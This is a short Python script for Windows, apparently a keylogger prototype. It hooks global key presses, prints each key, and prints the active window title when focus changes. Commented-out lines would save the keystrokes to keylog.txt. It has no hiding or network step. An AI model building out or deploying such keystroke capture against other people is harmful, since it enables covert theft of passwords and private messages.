import keyboard
import win32gui
import win32process
import time
import threading
import os
import asyncio

def get_active_window_title():
    return win32gui.GetWindowText(win32gui.GetForegroundWindow())

def get_active_window_pid():
    return win32process.GetWindowThreadProcessId(win32gui.GetForegroundWindow())[1]

async def on_key_event(event):
    # Log the pressed key
    print(event)
    # with open('keylog.txt', 'a', encoding='utf-8') as f:
    #     if event.name == 'space':
    #         f.write(' ')
    #     elif event.name == 'enter':
    #         f.write('\n')
    #     elif event.name == 'backspace':
    #         f.write('←')
    #     elif event.name.__len__() > 1:
    #         f.write(f'[{event.name}]')
    #     else:
    #         f.write(event.name)

def on_key_event_wrapper(event):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(on_key_event(event))

def check_window_change():
    previous_window_pid = get_active_window_pid()
    keyboard.on_press(on_key_event_wrapper)
    
    while True:
        current_window_pid = get_active_window_pid()

        if current_window_pid != previous_window_pid:
            previous_window_pid = current_window_pid
            # with open('keylog.txt', 'a') as f:
            print(f'\n---- {get_active_window_title()} ----\n')
                
        time.sleep(0.5)

_thread = threading.Thread(target=check_window_change, daemon=True)
_thread.start()

keyboard.wait('esc')
print('hi')
